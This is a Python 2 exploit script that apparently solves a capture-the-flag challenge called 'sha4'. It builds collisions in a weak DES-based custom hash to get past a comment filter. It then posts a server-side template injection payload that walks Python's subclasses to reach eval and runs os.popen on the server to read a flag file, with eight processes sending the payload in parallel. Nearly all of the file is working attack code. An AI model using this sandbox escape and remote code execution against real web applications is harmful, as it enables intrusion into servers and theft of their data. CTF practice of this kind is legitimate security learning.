from requests import Session
from Crypto.Cipher import DES
from multiprocessing import Process
import string
import struct

from pyasn1.codec.ber import encoder, decoder
from pyasn1.type.univ import OctetString
def encode(a):
	a = OctetString(a)
	return encoder.encode(a).encode('hex')

decode = lambda x: decoder.decode(x.decode('hex'))

def seven_to_eight(x):
  [val] = struct.unpack("Q", x+"\x00")
  out = 0
  mask = 0b1111111
  for shift in xrange(8):
    out |= (val & (mask<<(7*shift)))<<shift
  return struct.pack("Q", out)

def unpad(x):
  #split up into 7 byte chunks
  length = struct.pack("Q", len(x))
  sevens = [x[i:i+7].ljust(7, "\x00") for i in xrange(0,len(x),7)]
  sevens.append(length[:7])
  return map(seven_to_eight, sevens)

def hash(x):
  h0 = "SHA4_IS_"
  h1 = "DA_BEST!"
  keys = unpad(x)
  for key in keys:
    h0 = DES.new(key).encrypt(h0)
    h1 = DES.new(key).encrypt(h1)
  return h0+h1

def is_unsafe(s):
  for c in s:
    if c not in (string.ascii_letters + string.digits + " ,.:()?!-_'+=[]\t\n<>"):
      return True
  return False

def pad(s, hack):
	if hack == True:
		s = '  {{   ' + s
	else:
		s = '  [k   ' + s
	s += ' ' * (7 - len(s) % 7)
	if hack == True:
		s += '  }}'
	else:
		s += '  ]m'
	return s

assert hash(pad('1', True)) == hash(pad('1', False))
url = 'http://sha4.chal.pwning.xxx/comments'
def run(i):
	s = Session()
	mode = i % 2 == 0
	p = """None.__class__.__base__.__subclasses__().59()._module.__builtins__.eval(request.form.code)"""
	code = '''
	__import__('os').popen('cat sha4/flag_bilaabluagbiluariglublaireugrpoop').read()
	'''.strip()
	assert is_unsafe(p) == False
	print pad(p, mode), hash(pad(p, mode)).encode('hex')
	for i in range(7):
		_a = hash(encode(' ' * i + pad(p, True)).decode('hex'))
		_b = hash(encode(' ' * i + pad(p, False)).decode('hex'))
		if _a == _b:
			break
	while True:
		payload = encode(' ' * i + pad(p, mode))
		r = s.post(url, data={'comment': payload, 'code': code})
		if 'weird' not in r.text and not ('[k' in r.text and ']m' in r.text):
			print r.text
			exit()
if __name__ == '__main__':
	ts = [Process(target=run, args=(i, )) for i in range(8)]
	for t in ts:
		t.start()
	for t in ts:
		t.join()